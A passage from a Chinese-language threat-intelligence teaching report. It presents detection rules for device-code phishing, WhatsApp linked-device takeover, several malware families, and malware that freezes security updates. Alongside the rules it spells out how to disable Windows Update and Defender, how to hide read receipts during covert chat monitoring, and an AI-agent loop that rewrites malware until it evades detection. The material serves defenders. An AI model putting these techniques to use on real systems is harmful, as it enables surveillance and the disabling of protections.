+| where ResultType == 0                       // 成功
+| extend loc = tostring(LocationDetails.countryOrRegion)
+| where AppDisplayName has_any (&quot;Authentication Broker&quot;, &quot;Device Registration Service&quot;, &quot;Microsoft Authentication Broker&quot;)
+      or ResourceDisplayName has &quot;Device Registration&quot;
+| project TimeGenerated, UserPrincipalName, IPAddress, loc, AppDisplayName, DeviceDetail, ClientAppUsed
+// 加值：與使用者常態地理/裝置比對，device code 本就罕見於一般員工日常
+</code></pre>
+<p><strong>KQL（AuditLogs）— 攻擊者裝置被註冊進租戶（對映 T1098.005 / Figure「phantom device grants」）</strong></p>
+<pre><code class="language-kusto">AuditLogs
+| where OperationName in (&quot;Add device&quot;, &quot;Register device&quot;, &quot;Add registered owner to device&quot;)
+| where Result == &quot;success&quot;
+| extend actor = tostring(InitiatedBy.user.userPrincipalName)
+| extend dev = tostring(TargetResources[0].displayName)
+| project TimeGenerated, OperationName, actor, dev, TargetResources
+// 告警：短時間內非預期的新裝置註冊，尤其伴隨 A.2 的 deviceCode 登入
+</code></pre>
+<p><strong>政策面（沒有補丁、只能靠組態）</strong>：<br />
+- <strong>Conditional Access 封鎖 device code flow</strong>（<code>authenticationFlows</code> 阻擋非必要 device code），僅對確有 IoT/CLI 需求的群組例外——Microsoft 對本類手法的核心建議。<br />
+- 全面 <strong>phishing-resistant MFA（FIDO2 / 憑證式）</strong>：device code 濫用仍需使用者互動，phishing-resistant 綁定裝置可壓縮此面。<br />
+- 監控 <strong>token 重放</strong>：同一 refresh token 出現於地理/裝置不一致的換發、非上班時間的自動化 refresh 節奏。</p>
+<hr />
+<h3 id="a3-whatsapp-companion-device-linked-device-headless-browser-wppconnect">A.3 WhatsApp companion device 接管（linked device 協定 + headless browser + WPPConnect）</h3>
+<h4 id="a31">A.3.1 協定機制：多裝置架構讓「連結＝完整讀取」</h4>
+<p>WhatsApp 的<strong>多裝置（multi-device / companion device）</strong>架構讓 Web/Desktop 等伴生端不需主手機在線即可收發。連結時走 <strong>Signal 協定的金鑰交換</strong>：主手機掃 QR（內含 ref + 伴生端的公鑰）或輸入<strong>數字配對碼（pairing code）</strong>，完成後伺服器把該伴生端登錄為帳號的一個 companion device，並開始<strong>同步歷史對話（依同步範圍）＋即時新訊息</strong>。第三方研究把這種濫用手法稱為 <strong>GhostPairing</strong>：它不偷密碼、不攔 2FA，而是<strong>把 WhatsApp 自家的合法功能轉為監控管道</strong>。GenDigital 指出攻擊者偏好<strong>數字配對碼而非 QR</strong>，因為整個社交工程可在受害者單一裝置上完成，更順、更可規模化。</p>
+<h4 id="a32-headless-browser-wppconnect">A.3.2 headless browser + WPPConnect 的技術機制</h4>
+<ul>
+<li>攻擊者不用官方 App，而是開一整批 <strong>headless 瀏覽器</strong>（Puppeteer/Playwright 驅動的無頭 Chromium）連 <code>web.whatsapp.com</code>，達到<strong>農場規模</strong>自動化。</li>
+<li><strong>WPPConnect</strong> 是開源專案，封裝了 WhatsApp Web 的內部 JS store（<code>WPP.*</code> API），可程式化執行：取得配對 ref/QR、監看訊息事件、讀取對話、批次匯出——本案用它<strong>大量匯出俄語與烏克蘭語對話</strong>。</li>
+<li>因為攻擊端是「合法的 companion device」，所有讀取在協定上與正常多裝置無異，<strong>網路側幾乎無異常</strong>。</li>
+</ul>
+<h4 id="a33">A.3.3 「抑制已讀回條」的技術點</h4>
+<p>companion device 讀訊息<strong>預設會回送已讀回條（read receipt）</strong>，受害者會看到雙藍勾。攻擊者要隱蔽，就得抑制回條：可在 WhatsApp 設定關閉「已讀回報」（但這是帳號級、雙向失效，易被察覺），更常見的是<strong>在 WPPConnect/web store 層攔截或不觸發送出已讀事件</strong>（例如不呼叫會標記 seen 的 API、或以 <code>markUnseen</code> 復原狀態），使受害者端不顯示「已讀」。效果：受害者無感，攻擊者持續側錄。</p>
+<p><strong>連結時序（Mermaid）</strong>：</p>
+<pre class="mermaid">sequenceDiagram
+    autonumber
+    participant HB as &quot;攻擊者 headless 瀏覽器農場（Puppeteer + WPPConnect）&quot;
+    participant WA as &quot;WhatsApp 伺服器&quot;
+    participant V as &quot;受害者主手機&quot;
+    HB-&gt;&gt;WA: 開 web.whatsapp.com，取得 linking ref / QR 或 pairing code
+    HB-&gt;&gt;V: 釣魚誘餌：偽「加入安全通話 / 群組邀請」→ 誘導輸入 pairing code
+    V-&gt;&gt;WA: 於主手機輸入 code / 掃 QR → 授權「連結新裝置」
+    WA--&gt;&gt;HB: Signal 協定金鑰交換 → 攻擊者瀏覽器成為 companion device
+    WA--&gt;&gt;HB: 同步歷史對話 + 即時新訊息
+    Note over HB: 於 web store 層抑制 read receipt → 受害者端不顯示「已讀」
+    HB-&gt;&gt;WA: WPPConnect 批次匯出俄語 / 烏克蘭語對話
+    Note over V: 主手機一切正常；linked device 藏在「設定→已連結的裝置」深處
+</pre>
+<h4 id="a34">A.3.4 偵測構想</h4>
+<ul>
+<li><strong>平台側（可行性最高）</strong>：定期稽核 WhatsApp「已連結的裝置」清單、對新增 companion device 的推播即時告警；企業對高風險人員（如本案的前政府高官）建立「連結裝置變更」的例行檢查 SOP。</li>
+<li><strong>端點側</strong>：偵測環境中出現<strong>大量 headless Chromium 實例 + WhatsApp Web 自動化特徵</strong>（同一主機開啟數十個到 <code>web.whatsapp.com</code> 的無頭工作階段、Puppeteer/WPPConnect 的行程與模組指紋）。</li>
+<li><strong>網路側</strong>：對 <code>web.whatsapp.com</code> 的<strong>異常高並發、規律化</strong>工作階段（農場特徵）做行為基線比對；但因流量合法加密，網路側證據力弱，<strong>偵測重心應放在平台稽核與端點</strong>。</li>
+<li><strong>使用者教育</strong>：任何「輸入這組碼以加入通話/群組」的要求都應視為 device-linking 釣魚（對映上文 4.5 節與第 10.1 節）。</li>
+</ul>
+<hr />
+<h2 id="b">附錄 B — 惡意程式家族技術特徵與偵測規則構想</h2>
+<blockquote>
+<p>逐一整理報告（p.10–11）與第三方（Microsoft CaptiveCrunch、Google GTIG）揭露的<strong>功能、持久化、C2 協定</strong>，並附<strong>偵測構想</strong>。凡「僅 Anthropic 單一來源」或「命名存疑」者明確標註（呼應上文第 9.4、第 12 節）。<strong>規則為教學構想，非官方；部署前 refang 並依環境調校。</strong></p>
+</blockquote>
+<h3 id="b1-cloudsyncsvc-microsoft-cornflake-go-rat">B.1 CloudSyncSvc（= Microsoft CornFlake）— Go RAT，本案交叉佐證最強</h3>
+<table>
+<thead>
+<tr>
+<th>項目</th>
+<th>內容</th>
+<th>來源</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>語言/型態</td>
+<td>Go 編譯之 Windows RAT</td>
+<td>Microsoft CaptiveCrunch</td>
+</tr>
+<tr>
+<td>落地路徑</td>
+<td><code>%APPDATA%\svchost32\svchost32.exe</code>（偽裝 svchost）</td>
+<td>Microsoft</td>
+</tr>
+<tr>
+<td>服務偽裝</td>
+<td>註冊為服務，顯示名 <strong>"Cloud Sync Service"</strong>（＝ Anthropic 家族名 CloudSyncSvc 的由來）</td>
+<td>Microsoft</td>
+</tr>
+<tr>
+<td>功能</td>
+<td>閒置觸發截圖、剪貼簿內容 + 作用中視窗標題側錄、瀏覽器 cookie/密碼竊取（含 <strong>Chrome App-Bound Encryption</strong> 保護的 cookie）、可移除媒體掃描、遠端 shell</td>
+<td>Microsoft</td>
+</tr>
+<tr>
+<td>持久化</td>
+<td>Registry Run keys ＋ 排程工作，且有 <strong>watchdog 行程</strong>在持久化被移除後自動復原</td>
+<td>Microsoft</td>
+</tr>
+<tr>
+<td>C2</td>
+<td>透過 FruitStone 面板統一操控（見 B.3）</td>
+<td>Microsoft</td>
+</tr>
+</tbody>
+</table>
+<p><strong>YARA（偵測構想，行為/字串）</strong>：</p>
+<pre><code class="language-yara">rule GTG20006_CloudSyncSvc_CornFlake {
+    meta:
+        description = &quot;CloudSyncSvc (=CornFlake, Go RAT) 偽裝服務 — 教學偵測構想，非官方&quot;
+        reference   = &quot;Anthropic Sep-2026 p.10 ; Microsoft CaptiveCrunch&quot;
+        tlp = &quot;CLEAR&quot;
+    strings:
+        $svc  = &quot;Cloud Sync Service&quot; ascii wide
+        $path = &quot;svchost32\\svchost32.exe&quot; ascii wide
+        $go   = &quot;Go build ID:&quot; ascii
+        $abe  = &quot;App-Bound&quot; ascii nocase          // Chrome ABE cookie 竊取跡象
+        $wd   = &quot;watchdog&quot; ascii nocase
+    condition:
+        uint16(0) == 0x5A4D and $go and 2 of ($svc,$path,$abe,$wd)
+}
+</code></pre>
+<p><strong>Sigma（服務建立偽裝成 "Cloud Sync Service"）</strong>：</p>
+<pre><code class="language-yaml">title: Suspicious Service Masquerading as Cloud Sync Service (CornFlake)
+logsource: { product: windows, service: system }   # EID 7045
+detection:
+  selection:
+    EventID: 7045
+    ServiceName|contains: 'Cloud Sync'
+    ImagePath|contains: '\AppData\'      # 服務執行檔落在使用者可寫目錄＝高度可疑
+  condition: selection
+level: high
+</code></pre>
+<h3 id="b2-chocoshell-google-gtigcherrypie-powershell">B.2 ChocoShell（= Google GTIG「CHERRYPIE」）— 記憶體型 PowerShell 竊取器，凍結更新的載體</h3>
+<table>
+<thead>
+<tr>
+<th>項目</th>
+<th>內容</th>
+<th>來源</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>型態</td>
+<td>in-memory PowerShell 竊取器（無落檔、AMSI 繞過）</td>
+<td>Microsoft／上文 p.11</td>
+</tr>
+<tr>
+<td>竊取標的</td>
+<td>瀏覽器 cookie/密碼、WiFi 憑證、<strong>M365/Azure AD access + refresh token</strong>、以及 Token Broker 快取中的 <strong>WAM token（<code>.tbres</code> 檔）</strong> → 可<strong>不靠瀏覽器 cookie 直接重放工作階段</strong></td>
+<td>Microsoft</td>
+</tr>
+<tr>
+<td>提權/規避</td>
+<td>UAC 繞過、AMSI 繞過、<strong>鎖定 Windows Defender 簽章更新</strong>（＝上文「凍結安全更新」的具體載體，詳見附錄 C）</td>
+<td>上文 p.11／Microsoft</td>
+</tr>
+<tr>
+<td>AI 痕跡</td>
+<td>GTIG 版本（CHERRYPIE）含<strong>大量疑似 LLM 生成的痕跡</strong>，獨立佐證「AI 生成惡意程式」</td>
+<td>Google GTIG</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Sigma（<code>.tbres</code> WAM token 竊取 + AMSI/Defender 竄改）</strong>：</p>
+<pre><code class="language-yaml">title: WAM Token Broker Cache Access + Defender Tamper (ChocoShell)
+logsource: { product: windows, category: process_creation }
+detection:
+  tbres:
+    CommandLine|contains|all: [ 'powershell', '.tbres' ]
+  tokenbroker_path:
+    CommandLine|contains: '\Microsoft\TokenBroker\Cache'
+  amsi_defender:
+    CommandLine|contains:
+      - 'amsiInitFailed'
+      - 'Set-MpPreference'
+      - 'DisableSignatureUpdate'
+  condition: (tbres or tokenbroker_path) or amsi_defender
+level: high
+</code></pre>
+<blockquote>
+<p>教學點：<strong>竊 <code>.tbres</code>（WAM token）＝可繞過「只防 cookie 竊取」的作法</strong>——就算清空瀏覽器 cookie、綁定裝置，token broker 快取仍可能被重放。這是 A.2「token 層防禦」的延伸。</p>
+</blockquote>
+<h3 id="b3-shadow-c2-shadow_c2-fruitstone-c2">B.3 Shadow C2（＝技能表 <code>shadow_c2</code>）＋ FruitStone C2 面板</h3>
+<table>
+<thead>
+<tr>
+<th>項目</th>
+<th>內容</th>
+<th>來源</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Shadow C2</td>
+<td>容器化 C2 堆疊（docker compose 起 shadow_c2 服務）、<strong>Postgres 後端</strong>、附 CNC 儀表板與 builder UI；由 DevOps/前端 persona 之 skill 佈署到 VPS（MonoVM / eclipse proxies）</td>
+<td>上文 p.40 附錄 A</td>
+</tr>
+<tr>
+<td>FruitStone</td>
+<td>CaptiveCrunch 用來操控基礎設施的 <strong>web C2 面板</strong>，為<strong>單頁 HTML/JS 應用，且任何功能皆無驗證（no authentication）</strong></td>
+<td>Microsoft</td>
+</tr>
+</tbody>
+</table>
+<p><strong>偵測構想（基礎設施指紋，非端點）</strong>：<br />
+- <strong>FruitStone 無驗證面板</strong>意味著它<strong>直接暴露在公網</strong>——防守方/研究者可用面板 HTML 標題、favicon 雜湊、特定 JS 路徑做<strong>外部指紋掃描</strong>（如 Shodan/Censys 類被動資料），比對已知面板特徵。<br />
+- <strong>JA3/JA4（TLS 指紋）＋ 心跳週期規律性</strong>：容器化 C2 常有固定的 TLS 堆疊指紋與規律 beacon 間隔。<br />
+- <strong>Suricata（概念，需 refang 與環境化）</strong>：對已知 C2 網段/面板路徑的 HTTP 請求告警——</p>
+<pre><code># 概念示意；部署前以實際 C2 面板路徑/回應特徵取代，並移除 defang
+alert http $HOME_NET any -&gt; $EXTERNAL_NET any ( \
+  msg:&quot;GTG-20006 Shadow C2 / FruitStone panel beacon (heuristic)&quot;; \
+  flow:established,to_server; http.method; content:&quot;POST&quot;; \
+  http.uri; content:&quot;/api/tasking&quot;; nocase; \
+  threshold:type both, track by_src, count 5, seconds 300; \
+  classtype:command-and-control; sid:1000201; rev:1; )
+</code></pre>
+<h3 id="b4-wuengine-windows-update-engine">B.4 WUEngine — 偽裝「Windows Update Engine」的持久化元件</h3>
+<table>
+<thead>
+<tr>
+<th>項目</th>
+<th>內容</th>
+<th>來源</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>偽裝</td>
+<td>檔名 <code>WUEngine.exe</code>（IOC，p.11），命名蹭 Windows Update Engine；主題呼應「凍結安全更新」——偽裝成更新元件以降低懷疑並就近操縱更新</td>
+<td>上文 p.11</td>
+</tr>
+<tr>
+<td>角色</td>
+<td>技能表列為 Windows 開發者 persona 的持久化模組（WUEngine 持久化、COM/CLSID）</td>
+<td>上文 p.40</td>
+</tr>
+<tr>
+<td>第三方對應</td>
+<td>截至查證<strong>無明確第三方公開對應</strong>（單一來源，見第 12 節）</td>
+<td>—</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Sigma（可疑「更新引擎」執行檔在非系統路徑 + 服務化）</strong>：</p>
+<pre><code class="language-yaml">title: Fake Update Engine Binary (WUEngine) in Non-System Path
+logsource: { product: windows, category: process_creation }
+detection:
+  selection:
+    Image|endswith: '\WUEngine.exe'
+  filter_legit:
+    Image|startswith:
+      - 'C:\Windows\'
+      - 'C:\Program Files\'
+  condition: selection and not filter_legit
+level: medium
+</code></pre>
+<p>同理對 IOC 檔名 <code>DiagHost.exe</code>、<code>msedgeupdate.exe</code>、<code>msedgeupdate_v3.exe</code>（假 Edge 更新）套「非官方路徑 + 缺數位簽章 + 蹭合法元件名」的組合偵測。並對 <code>version.dll</code> 做<strong>側載（search-order hijacking）偵測</strong>：</p>
+<pre><code class="language-yaml">title: version.dll Side-Loading from Non-System Path
+logsource: { product: windows, category: image_load }
+detection:
+  selection: { ImageLoaded|endswith: '\version.dll' }
+  filter:
+    ImageLoaded|startswith: [ 'C:\Windows\System32\', 'C:\Windows\SysWOW64\' ]
+  condition: selection and not filter
+level: medium
+</code></pre>
+<h3 id="b5-powerchrome">B.5 PowerChrome — 單一來源，僅能就命名與行為推測</h3>
+<ul>
+<li><strong>命名推測</strong>：<code>PowerChrome</code> ＝ PowerShell + Chrome，型態上很可能是<strong>針對 Chromium 系瀏覽器機密（cookie/密碼/token）的 PowerShell 竊取器</strong>，與 ChocoShell 功能重疊但為不同家族名。</li>
+<li><strong>佐證狀態</strong>：截至本 pass <strong>無第三方公開對應</strong>，屬 Anthropic 單一來源命名（見第 9.4、第 12 節）。教學上不宜過度技術宣稱。</li>
+<li><strong>偵測構想</strong>：以「行為家族」而非家族名偵測——PowerShell 讀取 <code>\User Data\...\Login Data</code>、<code>\Network\Cookies</code>、DPAPI/<code>App-Bound</code> 解密跡象、<code>Local State</code> 讀取（取 ABE 金鑰）。此類偵測同時涵蓋 PowerChrome / ChocoShell / CornFlake 的共通竊密行為（呼應上文第 7.5「痛苦金字塔」——抓行為比抓家族名耐用）。</li>
+</ul>
+<h3 id="b6-miniplasma">B.6 MiniPlasma — 本地提權，命名存疑（教學上作「命名碰撞」案例）</h3>
+<ul>
+<li>報告僅列名，未述功能。上文第 9.4 指出它與一個公開 Windows 本地提權 PoC「MiniPlasma」（涉 <strong>CVE-2020-17103 / <code>cldflt.sys</code> 雲端過濾驅動</strong>）同名。</li>
+<li><strong>關聯未經證實</strong>——可能是命名碰撞、借用公開 PoC、或純巧合（見第 12 節第 4 點）。<strong>教學價值在方法論</strong>：遇到「malware 名 == 公開工具名」時，不可直接假設同源，須以雜湊/程式碼相似度佐證。</li>
+<li><strong>偵測構想（若確涉 cldflt.sys 類 LPE）</strong>：EDR 監控對雲端過濾驅動的異常 IOCTL、非預期行程取得 SYSTEM、<code>RunAs</code>/consent 提權路徑（對映 Figure W8「Elevation attempts」）。</li>
+</ul>
+<h3 id="b7-giftdropandroid-giftsexpress-rat">B.7 GiftDrop（Android，改牌自 GiftsExpress 監控 RAT）</h3>
+<table>
+<thead>
+<tr>
+<th>項目</th>
+<th>內容</th>
+<th>來源</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>血緣</td>
+<td>報告自述<strong>改牌（rebranded）自 GiftsExpress</strong> Android 監控 RAT（Telegram 生態流通的商用/半商用 RAT）</td>
+<td>上文 p.10</td>
+</tr>
+<tr>
+<td>投放</td>
+<td>ClickFix 鏈投放，IOC 檔名 <code>fix_network.apk</code>（「修復網路」誘餌，呼應飯店 WiFi 劇本）</td>
+<td>上文 p.11</td>
+</tr>
+<tr>
+<td>典型能力（監控 RAT 類推）</td>
+<td>讀取 SMS/通聯/通訊錄、麥克風/定位、通知監聽（NotificationListener）、<strong>濫用無障礙服務（Accessibility Service）</strong>擷取畫面與輸入、竊取 2FA 簡訊</td>
+<td>家族類型推斷</td>
+</tr>
+</tbody>
+</table>
+<p><strong>偵測構想（行動端）</strong>：<br />
+- <strong>投放面</strong>：飯店 WiFi 情境下「請安裝此 APK 以修復連線」＝典型側載釣魚；企業 MDM 應<strong>禁止非商店來源側載</strong>、封鎖 <code>fix_network.apk</code> 類檔名下載。<br />
+- <strong>行為面</strong>：Mobile EDR/MTD 偵測<strong>無障礙服務濫用 + 通知監聽 + 大量 SMS 讀取</strong>的權限組合；新安裝 App 請求 <code>BIND_ACCESSIBILITY_SERVICE</code> 且非知名來源即高風險。<br />
+- <strong>YARA（APK 內 DEX 字串，概念）</strong>：對 <code>classes.dex</code> 掃描 GiftsExpress 家族已知類名/字串（需自威脅情報取得樣本特徵；此處僅示意結構）。</p>
+<h3 id="b8-darkswordios-exploit-chain-ghostblade-payload">B.8 DarkSword（iOS exploit chain）＋ GHOSTBLADE payload</h3>
+<table>
+<thead>
+<tr>
+<th>項目</th>
+<th>內容</th>
+<th>來源</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>影響版本</td>
+<td><strong>iOS 18.4–18.7</strong>；Apple 於 <strong>iOS 26.3</strong> 全數修補</td>
+<td>Google GTIG</td>
+</tr>
+<tr>
+<td>漏洞（6 個，含 3 個零時差）</td>
+<td><code>CVE-2025-31277</code>、<code>CVE-2025-43529</code>、<strong><code>CVE-2026-20700</code>（dyld PAC 繞過，0-day）</strong>、<strong><code>CVE-2025-14174</code>（ANGLE 記憶體毀損，0-day）</strong>、<code>CVE-2025-43510</code>、<code>CVE-2025-43520</code></td>
+<td>Google GTIG／上文第 9.3</td>
+</tr>
+<tr>
+<td>感染鏈階段</td>
+<td>Safari 遇惡意 iframe → 突破 <strong>WebContent 沙箱</strong> → 經 <strong>WebGPU/ANGLE</strong> 注入 <strong>mediaplaybackd</strong> → 取得<strong>核心讀寫（XNU）</strong></td>
+<td>上文第 9.3／GTIG</td>
+</tr>
+<tr>
+<td>Payload</td>
+<td><strong>GHOSTBLADE</strong> 資料採礦器：SMS/iMessage、Telegram/WhatsApp 對話、通聯、通訊錄、瀏覽器 cookie、加密貨幣錢包；<strong>完成外洩後清暫存並退出、最小化留存</strong>（非持久監控型）</td>
+<td>Google GTIG</td>
+</tr>
+<tr>
+<td>基礎設施交叉</td>
+<td>第一階投放伺服器 <code>static.cdncounter[.]net</code> ＝ 上文 IOC 表網域（強交叉，UNC6353）</td>
+<td>上文第 7.1、9.3</td>
+</tr>
+<tr>
+<td>命名/擴散</td>
+<td>前身工具鏈為 <strong>Coruna</strong>；DarkSword kit 後有洩漏並被其他行為者（含一中國群集）重用投放 GHOSTBLADE——「工具外溢」的活教材</td>
+<td>Google GTIG</td>
+</tr>
+</tbody>
+</table>
+<p><strong>偵測構想（iOS 無法 YARA，改組態/情報/網路）</strong>：<br />
+- <strong>版本合規</strong>：MDM 強制 iOS ≥ 26.3；DarkSword 對已修補版本失效——<strong>修補即免疫</strong>是此鏈最有效的防線。<br />
+- <strong>Lockdown Mode</strong>：對高風險人員（本案類：外交、國防、無人機產業）開啟；可大幅壓縮 Safari/WebContent 攻擊面。<br />
+- <strong>網路情報</strong>：對 <code>cdncounter[.]net</code>、<code>uacounter[.]com</code>（Coruna）等基礎設施做 DNS sinkhole/Safe Browsing 封鎖（<strong>僅封鎖，切勿主動連線</strong>）；GTIG 已將相關網域納入 Safe Browsing。<br />
+- <strong>watering hole 偵測</strong>：監看常造訪之烏克蘭相關網站是否被植入隱藏 iframe（供應鏈/內容完整性監控）。</p>
+<blockquote>
+<p>課堂連結：B 節整體對映上文第 5 節 ATT&amp;CK 的 T1587.001/.004、T1203、T1547.001、T1555.003、T1071；並示範第 7.5 節「抓行為家族比抓家族名耐用」——本案有自動改寫閉環，家族名與雜湊會變，但「假更新命名 + version.dll 側載 + WAM token 竊取 + 凍結 Defender」這組<strong>組合行為</strong>是穩定抓手。</p>
+</blockquote>
+<hr />
+<h2 id="c">附錄 C — 「凍結安全更新」手法的技術實作與偵測</h2>
+<blockquote>
+<p>上文第 4.8「機制 B」、第 8.2 第 4 點、第 10.3 已定性此手法：<strong>掐斷受害端下載/執行新簽章的管道</strong>，讓防守社群做出的偵測「送不到前線」。本附錄補技術實作面與可部署偵測。本案的具體載體是 <strong>ChocoShell（鎖 Defender 簽章更新）</strong> 與 <strong>WUEngine（偽裝更新引擎）</strong>。</p>
+</blockquote>
+<h3 id="c1">C.1 技術實作（防守方需理解「更新是怎麼被凍結的」才能偵測）</h3>
+<p>凍結安全更新在 Windows 上有四條並用的路徑（對映 ATT&amp;CK <strong>T1562.001 Impair Defenses</strong>）：</p>
+<p><strong>(1) 停用/禁用更新與防護服務</strong><br />
+- Windows Update 相關：<code>wuauserv</code>（Windows Update）、<code>UsoSvc</code>（Update Orchestrator）、<code>WaaSMedicSvc</code>（Windows Update Medic，專門「自我修復」被關掉的更新服務——攻擊者必須連它一起處理，否則更新會被自動復原）、<code>uhssvc</code>、<code>BITS</code>（背景傳輸，簽章下載依賴它）。<br />
+- Defender 相關：<code>WinDefend</code>、<code>WdNisSvc</code>（網路檢測）、企業版 <code>Sense</code>（MDE 感測器）。<br />
+- 手法示意（概念，非可照抄腳本）：以 <code>sc.exe config &lt;svc&gt; start= disabled</code> + <code>sc.exe stop</code>、或 <code>Set-Service -StartupType Disabled</code>；<code>WaaSMedicSvc</code> 常需改登錄 <code>Start</code> 值繞過保護。</p>
+<p><strong>(2) 登錄政策關閉自動更新與簽章更新</strong><br />
+- <code>HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU\NoAutoUpdate = 1</code><br />
+- <code>HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware = 1</code>（<strong>注意</strong>：新版 Defender 在 <strong>Tamper Protection</strong> 開啟下<strong>已忽略</strong>此值——這反而讓「有人嘗試寫入此值」本身成為告警訊號）<br />
+- <code>...\Windows Defender\Signature Updates\</code> 下的更新來源/間隔遭竄改；<code>...\Real-Time Protection\DisableRealtimeMonitoring = 1</code><br />
+- PowerShell：<code>Set-MpPreference -SignatureUpdateInterval 0</code>、<code>-SignatureDisableUpdateOnStartupWithoutEngine $true</code> 等，直接讓簽章不更新。</p>
+<p><strong>(3) 切斷更新網路管道</strong><br />
+- 竄改 <code>hosts</code> 或本機防火牆，封鎖更新網域：<code>*.windowsupdate.com</code>、<code>ctldl.windowsupdate.com</code>（憑證信任清單）、<code>*.delivery.mp.microsoft.com</code>、<code>definitionupdates</code>/<code>wdcp</code> 類 Defender 雲端、<code>*.wns.windows.com</code>。<br />
+- 刪除 <code>C:\Windows\SoftwareDistribution</code> 快取、<strong>改名更新相關 DLL</strong>，使更新引擎跑不起來。</p>
+<p><strong>(4) 偽裝與掩護</strong><br />
+- 以 <code>WUEngine.exe</code> 等<strong>偽裝成更新元件</strong>的檔名就近操縱更新流程，讓管理者誤以為「更新元件在跑」，實則已被癱瘓。</p>
+<h3 id="c2">C.2 偵測構想——關鍵心法：「更新的沉默」本身就是訊號</h3>
+<p>傳統偵測盯「壞事發生」；凍結更新的偵測要盯「<strong>該發生的好事停了</strong>」。</p>
+<p><strong>(a) Sigma — 停用更新/防護服務</strong></p>
+<pre><code class="language-yaml">title: Impair Defenses - Disable Windows Update / Defender Services
+logsource: { product: windows, category: process_creation }
+detection:
+  sc_or_ps:
+    CommandLine|contains:
+      - 'wuauserv start= disabled'
+      - 'WaaSMedicSvc start= disabled'
+      - 'UsoSvc start= disabled'
+      - 'stop WinDefend'
+      - 'WdNisSvc start= disabled'
+      - 'Set-MpPreference -SignatureUpdateInterval 0'
+      - 'DisableRealtimeMonitoring $true'
+  condition: sc_or_ps
+level: high
+</code></pre>
+<p><strong>(b) Sigma — 竄改更新/防護登錄政策（含「寫入已被忽略的 DisableAntiSpyware」這個高信號動作）</strong></p>
+<pre><code class="language-yaml">title: Tamper with Windows Update / Defender Policy Keys
+logsource: { product: windows, category: registry_set }
+detection:
+  selection:
+    TargetObject|contains:
+      - '\WindowsUpdate\AU\NoAutoUpdate'
+      - '\Windows Defender\DisableAntiSpyware'
+      - '\Windows Defender\Signature Updates\'
+      - '\Real-Time Protection\DisableRealtimeMonitoring'
+    Details: 'DWORD (0x00000001)'
+  condition: selection
+level: high
+</code></pre>
+<p><strong>(c) Sigma — hosts 檔被寫入更新網域（切斷簽章管道）</strong></p>
+<pre><code class="language-yaml">title: Update Domain Blocked via hosts File
+logsource: { product: windows, category: file_event }
+detection:
+  file:
+    TargetFilename|endswith: '\drivers\etc\hosts'
+  condition: file
+level: medium   # 需搭配內容檢視：是否含 windowsupdate / definitionupdates 網域
+</code></pre>
+<p><strong>(d) 主動式「更新管道健康度」監控（最重要，直接反制此手法）</strong></p>
+<p>單機（PowerShell，可排程回報 SIEM）：</p>
+<pre><code class="language-powershell">$s = Get-MpComputerStatus
+[pscustomobject]@{
+  Host            = $env:COMPUTERNAME
+  SigAgeDays      = $s.AntivirusSignatureAge          # 告警：&gt; 3
+  SigVersion      = $s.AntivirusSignatureVersion
+  SigLastUpdated  = $s.AntivirusSignatureLastUpdated
+  RTPEnabled      = $s.RealTimeProtectionEnabled       # 告警：False
+  TamperProtected = $s.IsTamperProtected               # 告警：False
+}
+</code></pre>
+<p>車隊層（Microsoft Defender for Endpoint / Advanced Hunting，概念）：以 <code>DeviceTvmSecureConfigurationAssessment</code> 或裝置健康遙測比對「簽章版本落後雲端基準的裝置」，把<strong>簽章陳舊 + 更新服務停用 + Tamper Protection 關閉</strong>三者交集列為高優先事件。</p>
+<p><strong>(e) Defender Tamper Protection 事件</strong>：監控 Windows Defender 營運日誌的 <strong>Event ID 5001（即時防護被停用）、5007（設定被變更）、5010/5012（掃描/防護被關）</strong>，以及 Tamper Protection 阻擋嘗試的事件——在本案情境下，這些「有人試圖動 Defender」的事件即為早期訊號。</p>
+<p><strong>縱深防禦（非偵測，但關鍵）</strong>：開啟 <strong>Tamper Protection</strong>（阻擋多數登錄/服務竄改）、把 Defender 訊號送到<strong>雲端 SIEM/MDE</strong>（即使本機被凍結，雲端仍看得到「這台不再回報/簽章不更新」）、對更新來源用 <strong>WSUS/Update for Business + 監控合規率</strong>。核心觀念：<strong>把「更新是否送達前線」當成一級可觀測指標</strong>，而不是預設它一定成功。</p>
+<hr />
+<h2 id="d-ai-mermaid">附錄 D — AI 自主逃避偵測閉環（Mermaid 重畫）</h2>
+<blockquote>
+<p>上文第 4.8「機制 A」以文字四步（監控→改寫→重建→迭代）描述閉環。本附錄用 Mermaid 把它畫成<strong>時序圖</strong>與<strong>狀態流程圖</strong>，並補「防守方在哪些節點可以打斷這個迴圈」。</p>
+</blockquote>
+<h3 id="d1">D.1 閉環時序圖（監控 → 偵測 → 改寫 → 重建 → 再部署）</h3>
+<pre class="mermaid">sequenceDiagram
+    autonumber
+    participant M as &quot;監控代理 monitor agent&quot;
+    participant AV as &quot;安全產品 / 自建沙箱（偵測 oracle）&quot;
+    participant B as &quot;建置代理 builder skill（winAgent build loop）&quot;
+    participant R as &quot;拋棄式散佈主機 disposable host&quot;
+    participant V as &quot;受害流量（fake update / ClickFix）&quot;
+    Note over M,V: 人類僅在「skill 需精修」時介入；其餘由機器速度自轉
+    loop 迭代直到 undetected
+        M-&gt;&gt;AV: 提交當前變種做偵測測試（Evasion testing / AV test suites，對映 Figure W8）
+        AV--&gt;&gt;M: 回報：被標記 / 未被標記
+        alt 被偵測
+            M-&gt;&gt;B: 觸發改寫（調 skill 的規避邏輯：混淆、換 loader、改 COM/CLSID、換簽章）
+            B-&gt;&gt;B: 重新編譯 / 重建（功能等價、簽章不同）
+            B--&gt;&gt;M: 交付新變種
+        else 未被偵測
+            M-&gt;&gt;R: 上架新變種到拋棄式主機
+            R-&gt;&gt;V: 供受害流量下載並落地
+        end
+    end
+</pre>
+<h3 id="d2">D.2 閉環狀態流程圖（含防守方的「斷點」）</h3>
+<pre class="mermaid">flowchart TD
+    A[&quot;部署惡意程式到受害端&quot;] --&gt; B{&quot;監控代理：被安全產品偵測到？&quot;}
